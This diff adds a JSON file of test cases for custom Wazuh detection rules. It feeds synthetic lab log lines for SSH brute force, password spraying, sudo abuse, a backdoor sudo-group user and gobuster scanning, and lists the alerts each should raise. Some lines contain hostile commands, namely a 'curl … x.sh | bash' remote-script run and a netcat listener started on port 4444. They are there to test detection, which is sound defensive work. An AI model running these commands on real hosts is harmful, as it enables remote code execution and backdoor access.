@@ -1,0 +1,103 @@
+{
+  "_about": "Cases for rules/vigil_rules.py test. Each case runs in its own wazuh-logtest session. A step sends `log` `times` times ({n} counts up across the case); `expect` lists the rule IDs allowed on the last of those lines, `not` lists IDs that must not fire on any of them. `live_only` cases can't run in logtest (533 compares agent command output over time) and are checked in the lab instead.",
+  "cases": [
+    {
+      "name": "brute force that succeeds on guess 6 now raises an alert",
+      "gap": "40112 needs 5763 (8 failures); a password found sooner was INFO only",
+      "steps": [
+        {"log": "2026-11-17T01:00:0{n}.000000+00:00 web01 sshd[8{n}]: Failed password for deploy from 192.168.56.102 port 510{n} ssh2", "times": 4, "expect": ["5760"]},
+        {"log": "2026-11-17T01:00:05.000000+00:00 web01 sshd[8105]: Failed password for deploy from 192.168.56.102 port 51005 ssh2", "expect": ["100100"]},
+        {"log": "2026-11-17T01:00:06.000000+00:00 web01 sshd[8106]: Accepted password for deploy from 192.168.56.102 port 51006 ssh2", "expect": ["40112", "100101"]}
+      ]
+    },
+    {
+      "name": "4 failures then a login stays below the threshold",
+      "gap": "documents where the new threshold sits",
+      "steps": [
+        {"log": "2026-11-17T01:01:0{n}.000000+00:00 web01 sshd[81{n}]: Failed password for deploy from 192.168.56.102 port 511{n} ssh2", "times": 4, "expect": ["5760"]},
+        {"log": "2026-11-17T01:01:05.000000+00:00 web01 sshd[8125]: Accepted password for deploy from 192.168.56.102 port 51125 ssh2", "expect": ["5715"]}
+      ]
+    },
+    {
+      "name": "Wazuh's own brute-force rule still fires (one failure later)",
+      "gap": "side effect of 100100 taking the 5th failure",
+      "steps": [
+        {"log": "2026-11-17T01:02:0{n}.000000+00:00 web01 sshd[82{n}]: Failed password for deploy from 192.168.56.102 port 512{n} ssh2", "times": 8, "not": ["5763"]},
+        {"log": "2026-11-17T01:02:09.000000+00:00 web01 sshd[8299]: Failed password for deploy from 192.168.56.102 port 51299 ssh2", "expect": ["5763"]}
+      ]
+    },
+    {
+      "name": "password spray with 5 made-up users",
+      "gap": "5712 needs 8",
+      "steps": [
+        {"log": "2026-11-17T01:03:0{n}.000000+00:00 web01 sshd[83{n}]: Failed password for invalid user user{n} from 192.168.56.102 port 513{n} ssh2", "times": 4, "expect": ["5710"]},
+        {"log": "2026-11-17T01:03:05.000000+00:00 web01 sshd[8355]: Failed password for invalid user oracle from 192.168.56.102 port 51355 ssh2", "expect": ["100102"]}
+      ]
+    },
+    {
+      "name": "sudo root shell",
+      "gap": "every sudo to root was level 3",
+      "steps": [
+        {"log": "2026-11-17T01:04:00.000000+00:00 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash", "expect": ["100110"]}
+      ]
+    },
+    {
+      "name": "sudo running a downloaded script",
+      "gap": "every sudo to root was level 3",
+      "steps": [
+        {"log": "2026-11-17T01:04:10.000000+00:00 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash -c curl http://192.168.56.102/x.sh | bash", "expect": ["100111"]}
+      ]
+    },
+    {
+      "name": "ordinary sudo is left alone",
+      "gap": "no false positive",
+      "steps": [
+        {"log": "2026-11-17T01:04:20.000000+00:00 web01 sudo:   graperu : TTY=pts/0 ; PWD=/home/graperu ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx", "expect": ["5402", "5403"]}
+      ]
+    },
+    {
+      "name": "failed sudo spread over three commands",
+      "gap": "5404 only matches '3 incorrect password attempts' in one command",
+      "steps": [
+        {"log": "2026-11-17T01:05:0{n}.000000+00:00 web01 sudo:   deploy : 1 incorrect password attempt ; TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/true", "times": 2, "expect": ["5401"]},
+        {"log": "2026-11-17T01:05:03.000000+00:00 web01 sudo:   deploy : 1 incorrect password attempt ; TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/true", "expect": ["100140"]}
+      ]
+    },
+    {
+      "name": "backdoor user added to the sudo group",
+      "gap": "usermod had no decoder or rule",
+      "steps": [
+        {"log": "2026-11-17T01:06:00.000000+00:00 web01 usermod[3301]: add 'support' to group 'sudo'", "expect": ["100120"]}
+      ]
+    },
+    {
+      "name": "adding a user to an ordinary group is left alone",
+      "gap": "no false positive",
+      "steps": [
+        {"log": "2026-11-17T01:06:10.000000+00:00 web01 usermod[3302]: add 'support' to group 'users'", "not": ["100120"]}
+      ]
+    },
+    {
+      "name": "gobuster scan is named, and 404 counting still works",
+      "gap": "no scanner User-Agent detection; 31508 misses modern Nikto and gobuster",
+      "steps": [
+        {"log": "192.168.56.102 - - [17/Nov/2026:01:07:00 +0000] \"GET /p{n} HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\"", "times": 13, "expect": ["31101"]},
+        {"log": "192.168.56.102 - - [17/Nov/2026:01:07:14 +0000] \"GET /admin HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\"", "expect": ["100130"]}
+      ]
+    },
+    {
+      "name": "a browser's 404 burst is still Wazuh's 31151",
+      "gap": "no regression",
+      "steps": [
+        {"log": "192.168.56.20 - - [17/Nov/2026:01:08:00 +0000] \"GET /q{n} HTTP/1.1\" 404 162 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\"", "times": 13, "expect": ["31101"]},
+        {"log": "192.168.56.20 - - [17/Nov/2026:01:08:14 +0000] \"GET /zz HTTP/1.1\" 404 162 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\"", "expect": ["31151"]}
+      ]
+    },
+    {
+      "name": "netcat listener on web01",
+      "gap": "533 doesn't say what opened the port",
+      "live_only": "On web01: sudo -u deploy nohup nc -lvnp 4444 >/dev/null 2>&1 &  then wait up to 6 minutes for 100150 (instead of 533).",
+      "steps": []
+    }
+  ]
+}
